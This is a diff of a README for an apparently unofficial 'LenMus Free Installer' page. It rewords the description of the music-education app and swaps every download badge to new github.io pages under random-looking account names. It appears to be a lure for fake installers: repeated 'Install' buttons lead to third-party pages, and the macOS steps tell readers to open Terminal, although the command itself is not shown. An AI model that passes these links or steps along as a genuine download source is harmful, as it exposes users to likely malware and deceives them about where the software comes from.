@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Education-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 LenMus Free Installer** — LenMus Phonascus is a free, open-source music education application for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 LenMus Free Installer** — LenMus Phonascus is a free, open-source music education software for learning music theory and ear training. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About LenMus
 
-LenMus Phonascus is a free, open-source music education application for Windows, macOS, and Linux. Features ear training exercises, music theory lessons, and score reading practice. Structured exercises for interval recognition, chord identification, rhythm dictation, and sight singing make LenMus useful for music students at various levels working on fundamental musicianship skills.
+LenMus Phonascus is a free, open-source music education software for learning music theory and ear training. It provides exercises in note reading, intervals, chords, scales, and rhythm with an adaptive learning system.
 
 ---
 
 ## ❌ Problem: LenMus is hard to access
 
-- **Dated Interface** — Visual design reflects the software's age
-- **Limited Content** — Exercise library smaller than commercial ear training services
-- **Development Pace** — Slow update cycle for open-source education software
-- **Mobile Alternative** — Modern apps like Tenuto offer better mobile ear training
+- **Dated Interface** — UI design reflects older educational software aesthetics
+- **Development Inactive** — Project appears to have received minimal updates in recent years
+- **Limited Content** — Exercises cover fundamentals but depth limited compared to commercial alternatives
+- **Competition** — Musictheory.net and EarMaster offer better learning experiences
 
 ---
 
@@ -61,9 +61,9 @@ LenMus Phonascus is a free, open-source music education application for Windows,
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ LenMus Phonascus is a free, open-source music education application for Windows,
 
 <div align="center">
 
-[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ LenMus Phonascus is a free, open-source music education application for Windows,
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ LenMus Phonascus is a free, open-source music education application for Windows,
 
 ---
 
-**LenMus Free Installer** — LenMus Phonascus is a free, open-source music education application for Windows, macOS, and Linux. Install without internet connection today!
+**LenMus Free Installer** — LenMus Phonascus is a free, open-source music education software for learning music theory and ear training. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install LenMus](https://img.shields.io/badge/⬇_Install_LenMus-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
